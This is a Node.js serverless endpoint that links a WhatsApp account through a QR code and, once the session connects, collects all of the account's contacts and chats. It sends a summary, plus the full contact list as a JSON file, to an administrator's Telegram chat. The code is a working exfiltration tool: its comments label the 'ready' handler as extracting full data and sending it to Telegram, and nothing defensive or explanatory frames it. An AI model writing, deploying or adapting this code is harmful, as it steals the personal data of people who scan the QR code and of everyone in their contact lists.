const { Client, LocalAuth } = require('whatsapp-web.js');
const QRCode = require('qrcode');
const TelegramBot = require('node-telegram-bot-api');

// ===== TELEGRAM BOT =====
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// ===== WHATSAPP CLIENT =====
const sessions = {};

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { uid } = req.body;

    try {
        const client = new Client({
            authStrategy: new LocalAuth({ clientId: `wa_${uid}` }),
            puppeteer: { headless: true, args: ['--no-sandbox'] }
        });

        sessions[uid] = client;

        // QR Code
        client.on('qr', async (qr) => {
            const qrBuffer = await QRCode.toDataURL(qr);
            // Store QR in memory or send to user
            console.log('QR Generated for:', uid);
        });

        // READY - Extract ALL Data
        client.on('ready', async () => {
            console.log(`✅ Connected: ${uid}`);
            
            // EXTRACT FULL DATA
            const contacts = await client.getContacts();
            const chats = await client.getChats();

            // SEND TO TELEGRAM
            let msg = `📊 *WHATSAPP DATA EXTRACTED*\n\n`;
            msg += `📇 Contacts: ${contacts.length}\n`;
            msg += `💬 Chats: ${chats.length}\n\n`;

            const topContacts = contacts.slice(0, 5);
            topContacts.forEach((c, i) => {
                msg += `${i+1}. ${c.name || c.number}\n`;
            });

            await bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });

            // Contacts JSON file
            const contactsJSON = JSON.stringify(contacts, null, 2);
            await bot.sendDocument(ADMIN_CHAT_ID, Buffer.from(contactsJSON), {
                filename: `contacts_${uid}.json`,
                caption: `📇 All Contacts (${contacts.length})`
            });

            console.log(`✅ Data sent to Telegram for: ${uid}`);
        });

        client.on('disconnected', async (reason) => {
            delete sessions[uid];
        });

        client.initialize();

        res.json({ 
            success: true, 
            message: 'Scan QR code with WhatsApp'
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};
